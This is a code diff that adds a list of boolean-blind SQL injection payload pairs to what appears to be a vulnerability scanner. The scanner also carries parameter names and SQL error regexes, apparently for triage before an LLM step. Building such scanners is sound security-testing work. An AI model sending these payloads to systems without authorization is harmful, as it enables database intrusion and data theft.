@@ -32,6 +32,21 @@ COMMON_PARAMS = [
     "lang", "ref", "url", "path", "file", "dir", "date", "from", "to", "code",
 ]
 
+
+# Boolean-blind true/false pairs for structural detection.
+# Each tuple is (true_payload, false_payload) — true should return data,
+# false should return no/different data. Works on string AND numeric params.
+BOOLEAN_PAIRS = [
+    ("' OR '1'='1", "' OR '1'='2"),
+    ("' AND '1'='1", "' AND '1'='2"),
+    (" OR 1=1--", " OR 1=2--"),
+    (" AND 1=1--", " AND 1=2--"),
+    ("1 OR 1=1--", "1 OR 1=2--"),
+    ("1 AND 1=1--", "1 AND 1=2--"),
+    ("') OR ('1'='1", "') OR ('1'='2"),
+    ("1' OR '1'='1' --", "1' OR '1'='2' --"),
+]
+
 # Regex patterns for quick pre-LLM triage
 SQL_ERROR_PATTERNS = [
     r"SQL syntax.*MySQL",
